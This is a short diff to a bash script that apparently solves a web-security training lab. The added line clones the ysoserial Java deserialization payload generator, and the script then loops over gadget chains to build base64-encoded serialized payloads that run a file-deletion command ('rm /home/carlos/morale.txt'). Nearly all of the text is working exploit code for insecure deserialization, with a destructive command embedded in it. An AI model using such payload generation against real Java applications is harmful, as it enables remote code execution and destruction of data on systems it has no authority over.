@@ -1,5 +1,5 @@
 #!/bin/bash
-
+git clone https://github.com/frohoff/ysoserial.git
 for i in $( cat ysoserial)
 do
 java -jar ysoserial-master-8eb5cbfbf6-1.jar $i 'rm /home/carlos/morale.txt' | base64 | tr -d "/n" > d.txt
